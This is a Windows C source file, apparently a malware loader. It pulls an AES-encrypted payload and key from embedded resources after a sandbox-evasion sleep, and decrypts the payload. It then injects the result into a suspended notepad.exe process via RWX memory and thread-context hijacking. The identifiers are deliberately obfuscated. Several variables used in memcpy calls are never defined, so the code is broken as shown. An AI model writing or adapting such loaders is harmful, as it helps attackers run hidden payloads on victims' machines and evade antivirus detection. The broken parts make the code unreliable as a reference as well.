#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")


void aeaesdecokaes(char* codekumaa, DWORD codekumaaLen, char* keydude1299, DWORD keydude1299Len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)keydude1299, keydude1299Len, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)codekumaa, &codekumaaLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

void loadResource_with(const char* renamer, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

int main() {
    Sleep(4000);
    char* key101k;
    DWORD key101kLen;
    loadResource_with("dhanushkey1", &key101k, &key101kLen);
    char* code199k;
    DWORD code199kLen;
    loadResource_with("dhanushcode56", &code199k, &code199kLen);

     unsigned char karik12y[key101kLen];
    unsigned char karic0d2[code199kLen];

   
    memcpy(karik12y, kkeyakesey, kkeyakeseyLen);
    memcpy(karic0d2, kkcode, kkcodeLen);
    
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    GetThreadContext(pi.hThread, &ctx);

    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    aeaesdecokaes((char*)karic0d2, sizeof(karic0d2), karik12y, sizeof(karik12y));
    //Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
    WriteProcessMemory(pi.hProcess, memlo, karic0d2, sizeof(karic0d2), NULL);
    ctx.Rcx = (DWORD64)memlo; 
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread); 

    return 0;
}
